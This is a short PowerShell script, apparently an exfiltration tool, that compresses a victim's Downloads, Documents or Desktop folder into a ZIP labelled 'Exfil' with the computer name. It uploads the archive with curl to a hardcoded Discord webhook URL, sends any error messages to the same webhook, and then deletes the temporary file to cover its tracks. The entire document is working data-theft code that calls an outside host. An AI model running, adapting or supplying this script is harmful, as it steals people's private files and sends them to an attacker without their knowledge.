# Configuration
$hook = "https://discord.com/api/webhooks/1366201501802041374/ENdipWjx_vaIQYHXDYo-kwppUazTUQ9LpTj7oewX0g_wln4_vi9F_HdVdiaiBjFoovZY"
$userFolders = @("$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop")
$zipName = "$env:COMPUTERNAME-Exfil-$(Get-Date -f yyyy-MM-dd_hh-mm).zip"
$tempPath = "$env:TEMP\$zipName"

try {
    # Verify folders exist
    $validFolders = $userFolders | Where-Object { Test-Path $_ }
    if (-not $validFolders) {
        throw "No valid folders found for compression"
    }

    # Improved compression with .NET methods
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $compressionLevel = [System.IO.Compression.CompressionLevel]::Optimal
    
    [System.IO.Compression.ZipFile]::CreateFromDirectory(
        $validFolders[0], 
        $tempPath,
        $compressionLevel,
        $false  # Don't include base directory
    )

    # Verify ZIP creation
    if (-not (Test-Path $tempPath)) {
        throw "ZIP file creation failed"
    }

    # Discord upload with error handling
    $uploadResult = curl.exe -F "file1=@`"$tempPath`"" $hook 2>&1
    if ($LASTEXITCODE -ne 0) {
        throw "Upload failed: $uploadResult"
    }
}
catch {
    # Basic error reporting
    $errorMsg = $_.Exception.Message
    $errorBody = @{ content = "Exfil Error: $errorMsg" } | ConvertTo-Json
    Invoke-RestMethod -Uri $hook -Method Post -Body $errorBody -ContentType "application/json"
}
finally {
    # Cleanup with verification
    if (Test-Path $tempPath) {
        Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
    }
}
